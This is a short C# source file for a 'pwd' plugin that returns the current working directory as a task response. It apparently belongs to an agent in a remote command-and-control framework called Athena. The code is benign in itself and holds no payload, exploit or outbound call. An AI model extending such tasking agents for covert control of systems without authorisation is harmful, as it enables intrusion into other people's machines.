using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.IO;
using Athena.Commands;
using Athena.Models.Responses;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Pwd : IPlugin
    {
        public string Name => "pwd";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                completed = true,
                user_output = Directory.GetCurrentDirectory(),
                task_id = args["task-id"],
            });
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
